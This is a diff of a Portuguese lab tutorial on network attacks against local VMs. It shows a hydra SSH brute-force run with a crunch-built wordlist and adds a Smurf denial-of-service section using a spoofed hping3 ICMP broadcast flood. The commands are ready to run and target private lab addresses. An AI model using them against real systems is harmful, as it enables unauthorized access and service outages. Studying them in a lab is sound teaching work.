@@ -652,13 +652,13 @@ Vamos precisar das VMs, então suba as 3 máquinas.
 Eu escolhi o debian para ser o atacante nessa situação. 
 
 
-Instale a ferramenta hydra, popular ferramenta de força bruta com o comando:
+Instale a ferramenta **hydra**, popular ferramenta de força bruta com o comando:
 
 ```bash
 sudo apt-get install hydra -y
 ```
 
-Para gerar wordlist, instale o Crunch, ferramenta própria para criação em qualquer tipo de ataque por brute force, use o comando:
+Para gerar wordlist, instale o **Crunch**, ferramenta própria para criação em qualquer tipo de ataque por brute force, use o comando:
 
 ```bash
 sudo apt-get install crunch -y 
@@ -677,7 +677,7 @@ possíveis combinações dos caracteres da string mMiInN0123%#. Gerando 1728 sen
 
 ![](imagens/wordlist.png)
 
-Agora efetue o ataque por meio do Hydra, conforme o comando:
+Agora efetue o ataque por meio do **Hydra**, conforme o comando:
 
 ```bash
 hydra -l msfadmin -P wlist.txt -V -f -t 4 192.168.0.101 ssh
@@ -691,6 +691,29 @@ Para acompanhamento de suas atividades, a opção -V (verbose), para mostrar na 
 
 ![](imagens/hydra.png) 
 
+
+### Ataques Smurf. 
+
+Esse tipo de ataque de negação distribuido, é onde o atacante frauda ("spoofa") o endereço  da vitima, e depois envia uma quantidades de pacotes ICMP tipo echo-request, ao endereço de broadcast da rede, fazendo hosts ativos responderem diretamente a vítima, tornando ela temporariamente indisponivel. 
+
+
+Instale o hping3 com o comando no atacante:
+
+```bash
+sudo apt-get install hping3
+sudo apt update
+```
+
+Vamos utilizar a ferramenta **hping3** solicitando que ela inunde (--flood) o endereço de broadcast da rede (192.168.0.255) com o pacote ICMP ping pela vitima 192.168.0.190, use o comando:
+
+
+```bash
+hping3 -1 --flood -a 192.168.0.190 192.168.0.255
+```
+Fazendo com que seja o alvo 192.168.0.190 o emissor dos pacotes há uma alta demanda de pacotes. 
+
+
+![](imagens/smurf.png)
 
 
 
